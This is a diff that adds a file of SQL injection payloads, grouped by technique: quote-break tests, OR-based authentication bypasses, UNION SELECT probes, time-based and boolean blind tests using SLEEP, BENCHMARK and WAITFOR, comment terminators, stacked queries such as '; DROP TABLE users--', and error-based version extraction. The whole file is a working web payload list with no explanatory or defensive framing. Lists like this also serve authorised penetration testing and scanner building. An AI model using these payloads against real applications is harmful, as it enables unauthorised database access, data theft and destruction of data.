@@ -1,0 +1,55 @@
+# SQL Injection Payloads
+# Basic tests
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+
+# OR-based
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+" OR 1=1--
+' OR 'a'='a
+" OR "a"="a
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+
+# Time-based blind
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('A'))--
+'; WAITFOR DELAY '00:00:05'--
+
+# Boolean-based blind
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+
+# Comment-based
+'--
+"--
+'#
+"#
+'/*
+"/*
+
+# Stacked queries
+'; DROP TABLE users--
+"; DROP TABLE users--
+
+# Error-based
+' AND 1=CONVERT(int,(SELECT @@version))--
+" AND 1=CONVERT(int,(SELECT @@version))--
+' AND extractvalue(1,concat(0x7e,version()))--
